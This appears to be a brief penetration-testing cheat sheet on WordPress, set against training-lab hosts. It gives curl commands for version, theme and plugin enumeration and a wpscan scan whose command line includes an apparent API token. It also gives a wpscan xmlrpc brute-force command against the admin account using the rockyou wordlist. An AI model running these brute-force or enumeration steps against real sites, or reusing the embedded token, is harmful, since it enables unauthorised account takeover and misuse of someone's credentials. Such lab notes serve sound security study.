## Manual Enumeration
### Enumerate the WordPress version
```
curl -s http://blog.inlanefreight.local | grep WordPress
```
### Enumerate themes
```
curl -s http://metapress.htb/wp-login.php?action=lostpassword | grep themes
```
### Enumerate Plugins
```
curl -s http://metapress.htb/wp-login.php?action=lostpassword | grep plugins
```
## Automated Enumeration
```
wpscan --url http://metapress.htb --enumerate --api-token oSH0dbznYyEQ7HMshRPowmQhHtwJQXJ8XfZ8zsn3Tzo -o wpscan
```
If you have gotten valid credentials instead of using the flag --wp-auth, get a valid cookie and use the flag --cookie-string to get a new scan and probably new interesting data.
## Attacking WordPress
### Login Bruteforce
```
sudo wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url http://metapress.htb
```